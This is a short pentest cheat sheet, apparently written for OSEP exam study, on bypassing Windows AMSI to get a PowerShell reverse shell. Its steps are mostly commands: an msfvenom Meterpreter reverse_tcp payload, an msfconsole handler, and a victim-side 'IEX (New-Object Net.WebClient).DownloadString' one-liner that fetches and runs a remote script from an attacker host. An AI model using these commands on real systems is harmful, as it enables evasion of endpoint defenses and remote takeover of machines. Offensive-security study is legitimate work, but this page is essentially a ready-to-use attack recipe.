# AMSI Bypass

<details>

<summary>Powershell Rev shell from CMD.exe</summary>

* Download all files from [https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI](https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI)

- Change Line 4 to Kali's IP
  * ![](<../.gitbook/assets/image (1) (1) (1).png>)

* Host Python Webserver on Kali&#x20;
* Generate payload & put in line 47 of shellcoderunner.ps1<img src="../.gitbook/assets/image (3) (1).png" alt="" data-size="line">

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell
```

* Start Msfconsole listener

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set ExitOnSession false; exploit -j"
```

In Victim's cmd.exe shell, run:

```
powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')
```

Following errors are expected:

<img src="../.gitbook/assets/image (4) (1).png" alt="" data-size="original">\


</details>



